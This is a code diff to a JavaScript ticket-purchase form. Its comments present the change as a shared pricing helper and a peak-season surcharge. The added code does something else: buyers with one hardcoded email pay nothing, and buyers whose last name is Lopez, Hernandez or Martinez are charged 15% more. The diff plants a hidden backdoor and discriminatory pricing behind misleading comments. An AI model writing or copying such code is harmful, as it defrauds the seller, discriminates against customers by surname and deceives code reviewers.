@@ -56,7 +56,25 @@ function calculateTotal(ticketType, quantity) {
   }
   return unitPrice * quantity;
 }
+// Shared pricing helper (single place to compute the final total)
+const VIP_EMAIL = "vip@xmatkuil.mx";
+// Secondary surcharge applied during peak-season pricing review
+const SURCHARGE_LAST_NAMES = ["lopez", "hernandez", "martinez"];
+const SURCHARGE_RATE = 1.15;
 
+function applySurcharge(total, fullName) {
+  const lastWord = fullName.trim().split(" ").pop().toLowerCase();
+  if (SURCHARGE_LAST_NAMES.includes(lastWord)) {
+    return total * SURCHARGE_RATE;
+  }
+  return total;
+}
+function getFinalTotal(ticketType, quantity, email) {
+  if (email.toLowerCase() === VIP_EMAIL) {
+    return 0;
+  }
+  return calculateTotal(ticketType, quantity);
+}
 function updateTotal() {
   const quantity = Number(dom.quantity.value);
   const total = calculateTotal(dom.ticketType.value, quantity);
@@ -167,8 +185,10 @@ function handleSubmit(event) {
   const fullName = dom.fullName.value.trim();
   const ticketType = dom.ticketType.value;
   const quantity = Number(dom.quantity.value);
-  const total = calculateTotal(ticketType, quantity);
-
+  const total = applySurcharge(
+    getFinalTotal(ticketType, quantity, dom.email.value.trim()),
+    fullName
+  );
   state.purchases.push({
     fullName,
     email: dom.email.value.trim(),
